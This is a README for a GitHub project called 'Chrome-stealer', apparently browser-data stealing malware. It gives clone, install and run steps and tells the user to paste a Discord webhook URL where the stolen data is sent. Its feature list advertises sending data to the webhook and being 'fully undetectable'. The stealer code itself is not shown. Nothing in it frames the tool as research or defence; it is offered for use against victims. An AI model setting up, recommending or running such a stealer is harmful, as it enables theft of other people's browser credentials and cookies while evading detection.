### ☕ Usage
- #### 💻 Installing
    ```
    git clone https://github.com/Plasmonix/Chrome-stealer
    cd Chrome-stealer
    pip install -r requirements.txt
    ```

- #### 🛠 Setup
    ```py
    WEBHOOK = "https://discord.com/api/webhooks/..." #Paste your webhook url
    ```

- #### 💣 Execute
    ```
    run main.py
    ```

### 🏆 Features List
- Quick setup
- Send data to webhook
- Fully undetectable

## 📚 Contributions
All suggestions are welcome.

## 📜 License
This project is licensed under [GNU General Public License](https://github.com/Plasmonix/Chrome-stealer/blob/main/LICENSE).

<p align="center">
  <img src="https://badges.frapsoft.com/os/v1/open-source.svg?v=103" alt="Open Source">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
</p>